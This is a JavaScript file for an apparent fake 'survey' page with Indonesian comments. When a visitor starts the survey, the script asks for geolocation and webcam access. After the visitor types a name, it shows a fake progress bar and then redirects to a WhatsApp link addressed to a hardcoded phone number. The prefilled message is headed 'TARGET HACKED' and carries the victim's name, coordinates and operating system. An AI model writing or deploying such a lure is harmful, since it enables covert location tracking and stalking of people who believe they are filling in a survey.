const nomorWA = "628979100200";
let userData = { coords: "Fetching...", os: navigator.platform };

// Tombol Mulai
document.getElementById('start-survey').addEventListener('click', async () => {
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    
    // Minta Izin
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            userData.coords = `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
        });
    }
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('webcam').srcObject = stream;
    } catch (e) {}
});

// Fungsi untuk proses kirim
function processSubmit() {
    const name = document.getElementById('name').value;
    if (!name) return alert("Masukkan nama dulu!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const interval = setInterval(() => {
        prg += 25;
        document.getElementById('progress').style.width = prg + "%";
        if (prg >= 100) {
            clearInterval(interval);
            const msg = `🚨 *TARGET HACKED* 🚨%0A%0A👤 Nama: ${name}%0A📍 Lokasi: ${userData.coords}%0A💻 OS: ${userData.os}`;
            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 800);
}

// Menjalankan Enter di Input Nama
document.getElementById('name').addEventListener('keydown', (e) => {
    if (e.key === "Enter") {
        processSubmit();
    }
});

// Menjalankan Klik di Tombol Kirim
document.getElementById('submit-survey').addEventListener('click', processSubmit);
